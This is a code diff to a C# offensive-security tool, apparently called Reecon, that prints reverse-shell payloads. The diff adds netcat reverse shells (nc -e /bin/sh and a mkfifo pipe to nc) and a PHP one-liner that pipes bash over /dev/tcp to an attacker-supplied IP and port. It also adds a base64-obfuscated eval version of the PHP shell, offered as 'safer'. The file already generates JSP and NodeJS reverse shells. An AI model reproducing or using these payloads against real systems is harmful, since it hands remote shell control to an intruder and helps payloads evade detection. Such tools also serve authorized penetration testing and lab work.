@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Text;
 
 namespace Reecon
 {
@@ -9,13 +10,17 @@ namespace Reecon
             if (args.Length < 2)
             {
                 Console.WriteLine("Shell Usage: reecon --shell shellType [IP Port]");
-                Console.WriteLine("Types: bash, jsp, nodejs, war");
+                Console.WriteLine("Types: bash, jsp, nc, nodejs, php, war");
                 General.GetIP();
                 return;
             }
             string shellType = args[1];
             string ip = "10.0.0.1";
-            string port = "1234";
+            string port = "9001";
+            if (args.Length == 3)
+            {
+                ip = args[2];
+            }
             if (args.Length == 4)
             {
                 ip = args[2];
@@ -35,11 +40,23 @@ namespace Reecon
                 Console.WriteLine();
                 Console.WriteLine("--> Save as file.jsp");
             }
+            else if (shellType == "nc")
+            {
+                Console.WriteLine("Netcat Shell");
+                Console.WriteLine("------------");
+                Console.WriteLine(ncShell(ip, port));
+            }
             else if (shellType == "nodejs")
             {
                 Console.WriteLine("NodeJS Shell");
-                Console.WriteLine("----------");
+                Console.WriteLine("------------");
                 Console.WriteLine(nodeJSShell(ip, port));
+            }
+            else if (shellType == "php")
+            {
+                Console.WriteLine("PHP Shell");
+                Console.WriteLine("---------");
+                Console.WriteLine(phpShell(ip, port));
             }
             else if (shellType == "war")
             {
@@ -70,10 +87,25 @@ namespace Reecon
                     + "(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start(); (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();} catch(Exception e ) {} %>";
         }
 
+        private static string ncShell(string ip, string port)
+        {
+            string shellOne = $"nc -e /bin/sh {ip} {port}";
+            string shellTwo = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
+            return shellOne + Environment.NewLine + shellTwo;
+        }
+
         private static string nodeJSShell(string ip, string port)
         {
             Console.WriteLine("Test: (function(){return \"Reelix\"})()");
             return $"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f', ()=>{{}})";
+        }
+
+        private static string phpShell(string ip, string port)
+        {
+            string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
+            string b64Shell = System.Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
+            return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
+                + "Safer: <?php eval(base64_decode('" + b64Shell + "')); ?>";
         }
     }
 }
